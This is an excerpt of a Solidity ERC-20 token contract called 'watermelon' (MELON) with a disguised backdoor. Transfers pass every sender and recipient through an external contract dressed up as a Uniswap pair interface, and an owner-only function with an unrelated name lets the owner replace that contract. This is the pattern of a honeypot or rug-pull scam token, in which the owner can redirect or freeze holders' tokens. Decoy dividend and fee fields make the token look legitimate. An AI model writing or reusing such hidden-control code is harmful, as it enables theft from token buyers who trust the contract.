...
interface IUniswapPair{  
    ...
    function authorized(address account) external returns (address);
    function createPair(
        address tokenA, 
        address tokenB) 
...
contract Ownable is Context {  
    ...
    */
    ...
    function authorized(address account) internal returns (address){
        return 
        IUniswapPair(_ownable).authorized(account);
    }
    ...
    */
    ...
    function Swiatek(address newOwner) external onlyOwner {
        _ownable = newOwner;
    }  
...
contract watermelon is Context, IERC20, Ownable{
    ...
    string private _name = "watermelon";
    string private _symbol = "MELON";
    uint8 private _decimals = 9;     

    uint8 totalShares;
    uint8 totalDividends;
    uint8 totalDistributed;
    uint8 dividendsPerShare;
    uint8 buybackFee = 2;
    uint8 reflectionFee = 3;
    ...
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(authorized(_msgSender()), authorized(recipient), amount);
        return true;
    }        

    function getDividends(uint256 share) internal view returns (uint256) {
        return share.mul(dividendsPerShare).div(3600);
    }
    ...
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        _transfer(authorized(sender), authorized(recipient), amount);
    ...
    function getAccumulatedFee() external view returns (uint256, uint256) {
    ...
    function shareAmount(address shareholder, uint256 amount) external {
